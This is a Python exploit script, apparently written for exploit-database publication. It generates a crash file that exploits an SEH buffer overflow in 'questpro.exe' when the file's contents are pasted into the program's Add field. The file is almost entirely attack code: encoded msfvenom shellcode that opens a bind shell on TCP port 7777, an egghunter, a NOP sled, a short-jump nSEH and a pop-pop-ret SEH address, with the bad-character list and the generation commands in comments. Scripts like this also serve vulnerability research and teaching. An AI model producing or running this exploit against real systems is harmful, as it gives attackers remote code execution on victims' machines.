#!/usr/bin/python
#1- Open 'questpro.exe'
#2- Go to Add   
#3- Paste payload from generated txt file

blt = '\033[92m[\033[0m+\033[92m]\033[0m '           # green success bullet
err = '\033[91m[\033[0m!\033[91m]\033[0m '           # red   error   bullet

File     = 'crash.txt'

try:
    # SEH triggered by exception 'Access violation when reading [41414141]'
    # EIP: 00403AB8    8B10       mov edx, dword ptr ds:[eax]
    # Bad Charaters - These bytes truncate the buffer on stack:
    #    badchrs  = '\x00\x02\x03\x04\x05\x06\x07\x08\x0a\x0c\x0d'
    #boku# msfvenom -p windows/shell_bind_tcp LPORT=7777 -v shellcode -a x86 --platform windows -e x86/call4_dword_xor 
    # -f python -b '\x00\x02\x03\x04\x05\x06\x07\x08\x0a\x0c\x0d' 
    # x86/call4_dword_xor succeeded with size 352 (iteration=0)
    shellcode = '\x42\x4f\x4b\x55\x42\x4f\x4b\x55' # Egg: BOKUBOKU
    shellcode += b"\x29\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0"
    shellcode += b"\x5e\x81\x76\x0e\xce\xd2\x2a\x12\x83\xee\xfc"
    shellcode += b"\xe2\xf4\x32\x3a\xa8\x12\xce\xd2\x4a\x9b\x2b"
    shellcode += b"\xe3\xea\x76\x45\x82\x1a\x99\x9c\xde\xa1\x40"
    shellcode += b"\xda\x59\x58\x3a\xc1\x65\x60\x34\xff\x2d\x86"
    shellcode += b"\x2e\xaf\xae\x28\x3e\xee\x13\xe5\x1f\xcf\x15"
    shellcode += b"\xc8\xe0\x9c\x85\xa1\x40\xde\x59\x60\x2e\x45"
    shellcode += b"\x9e\x3b\x6a\x2d\x9a\x2b\xc3\x9f\x59\x73\x32"
    shellcode += b"\xcf\x01\xa1\x5b\xd6\x31\x10\x5b\x45\xe6\xa1"
    shellcode += b"\x13\x18\xe3\xd5\xbe\x0f\x1d\x27\x13\x09\xea"
    shellcode += b"\xca\x67\x38\xd1\x57\xea\xf5\xaf\x0e\x67\x2a"
    shellcode += b"\x8a\xa1\x4a\xea\xd3\xf9\x74\x45\xde\x61\x99"
    shellcode += b"\x96\xce\x2b\xc1\x45\xd6\xa1\x13\x1e\x5b\x6e"
    shellcode += b"\x36\xea\x89\x71\x73\x97\x88\x7b\xed\x2e\x8d"
    shellcode += b"\x75\x48\x45\xc0\xc1\x9f\x93\xba\x19\x20\xce"
    shellcode += b"\xd2\x42\x65\xbd\xe0\x75\x46\xa6\x9e\x5d\x34"
    shellcode += b"\xc9\x2d\xff\xaa\x5e\xd3\x2a\x12\xe7\x16\x7e"
    shellcode += b"\x42\xa6\xfb\xaa\x79\xce\x2d\xff\x78\xc6\x8b"
    shellcode += b"\x7a\xf0\x33\x92\x7a\x52\x9e\xba\xc0\x1d\x11"
    shellcode += b"\x32\xd5\xc7\x59\xba\x28\x12\xd0\xb3\xa3\xf4"
    shellcode += b"\xa4\xc2\x7c\x45\xa6\x10\xf1\x25\xa9\x2d\xff"
    shellcode += b"\x45\xa6\x65\xc3\x2a\x31\x2d\xff\x45\xa6\xa6"
    shellcode += b"\xc6\x29\x2f\x2d\xff\x45\x59\xba\x5f\x7c\x83"
    shellcode += b"\xb3\xd5\xc7\xa6\xb1\x47\x76\xce\x5b\xc9\x45"
    shellcode += b"\x99\x85\x1b\xe4\xa4\xc0\x73\x44\x2c\x2f\x4c"
    shellcode += b"\xd5\x8a\xf6\x16\x13\xcf\x5f\x6e\x36\xde\x14"
    shellcode += b"\x2a\x56\x9a\x82\x7c\x44\x98\x94\x7c\x5c\x98"
    shellcode += b"\x84\x79\x44\xa6\xab\xe6\x2d\x48\x2d\xff\x9b"
    shellcode += b"\x2e\x9c\x7c\x54\x31\xe2\x42\x1a\x49\xcf\x4a"
    shellcode += b"\xed\x1b\x69\xda\xa7\x6c\x84\x42\xb4\x5b\x6f"
    shellcode += b"\xb7\xed\x1b\xee\x2c\x6e\xc4\x52\xd1\xf2\xbb"
    shellcode += b"\xd7\x91\x55\xdd\xa0\x45\x78\xce\x81\xd5\xc7"
    # offset is here in paylaod structure
    nops      = '\x90'*70
    #boku@kali# msf-egghunter --egg BOKU -f python -b '\x00\x02\x03\x04\x05\x06\x07\x08\x0a\x0c\x0d' -p windows -v egghunter
    egghunter =  b""
    egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
    egghunter += b"\x2e\x3c\x05\x5a\x74\xef\xb8\x42\x4f\x4b\x55"
    egghunter += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    offset     = '\x41' * (4116-len(shellcode+nops+egghunter))
    # nasm > jmp short -100
    #       \xeb\x9a 
    nSEH     = '\xcc\xeb\x9a\x90'
    # 0x00400000 [questpro.exe] Rebase: False | ASLR: False | SafeSEH: False 
    # 0x0042666b [questpro.exe] : pop ecx # pop ebp # ret  | {PAGE_EXECUTE_READ} 
    SEH      = '\x6b\x66\x42'
    payload  = shellcode+offset+nops+egghunter+nSEH+SEH
    f        = open(File, 'w')                       # open file for write
    f.write(payload)
    f.close()                                        # close the file
    print blt + File + " created successfully "
except:
    print err + File + ' failed to create'

